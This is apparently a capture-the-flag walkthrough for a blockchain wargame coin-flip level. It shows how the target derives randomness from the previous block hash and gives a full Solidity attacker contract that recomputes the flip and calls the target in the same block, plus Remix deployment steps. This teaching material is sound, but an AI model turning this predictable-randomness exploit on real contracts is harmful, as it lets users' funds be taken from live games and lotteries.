
Great job on reaching Level 4! You've come a long way in grasping important concepts. 👍

## The Challenge: Predicting 10 Correct Guesses

The challenge at this stage involves predicting 10 correct guesses in a row. Since we lack the ability to foresee the future, the key lies in identifying any loopholes in the system that can guide our decision-making.

## Understanding the Decision-Making Process

To improve our chances, it's essential to comprehend how the contract determines whether a statement is true or false before prompting the user to make a guess. By adopting the same methodology used by the contract, we can discern whether to guess true or false for each turn.

## Embracing the Random Number Concept

A fundamental concept emphasized in this level is the generation of random numbers. Understanding how to generate random numbers is crucial, and the complexity of achieving true randomness in the context of blockchain adds an extra layer of challenge.

### Random Number Generation Code:

    ```
        uint256 blockValue = uint256(blockhash(block.number - 1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;




block,number and factor are the two variables which are getting used to generate the block numbers. Now, you can think if there are two transactions happening in a block, it will have the same block.number and we can benefit this. Factor is anyways constant. 

Now you know what we need to do, open REMIX, create a new contract and paste the below 
code.

    ```
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.8.0;
    
    import "./coin.sol";
    
    contract coinattack 
    {
        CoinFlip coinFlip1 = CoinFlip(0x269a3e1a18715D62068b8c9B939Bfdeb5D6142c2);
    
        uint256 public consecutiveWins = 0;
        uint256 lastHash;
        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    
        function triggerWin() public returns(bool)
        {
            uint256 blockValue = uint256(blockhash(block.number - 1));
    
            if (lastHash == blockValue) {
                return false;
            }
    
            lastHash = blockValue;
            uint256 coinFlip = blockValue / FACTOR;
            bool side = coinFlip == 1 ? true : false;
    
            coinFlip1.flip(side);
            consecutiveWins++;
    
            return true;
        }
    }
    
 # Contract Deployment and Verification

## Compilation and Deployment

After successfully compiling the contract, proceed with its deployment. Once deployed, you can call the designated function to trigger the sequence and check the value of the `consecutiveWins` variable.

## Verification Process

To ensure accuracy and gain a deeper understanding of the process, manually call the function 10 times and verify the outcome. Although a loop could be used, this step-by-step approach provides a clearer illustration of the underlying flow.

### Step-by-Step Verification:

1. **Call Function:** Manually call the designated function.
2. **Check `consecutiveWins`:** After triggering the function, inspect the value of the `consecutiveWins` variable.
3. **Repeat:** Repeat this process a total of 10 times.

## Final Confirmation

Once you observe that the `consecutiveWins` variable has reached 10, proceed to "Submit Instance." Congratulations on successfully completing this stage!

Feel free to explore the intricacies of the contract's behavior and gain a hands-on understanding of how the consecutive wins variable evolves with each function call. Best of luck! 🚀   
    
    
    
    
    
    
    
    











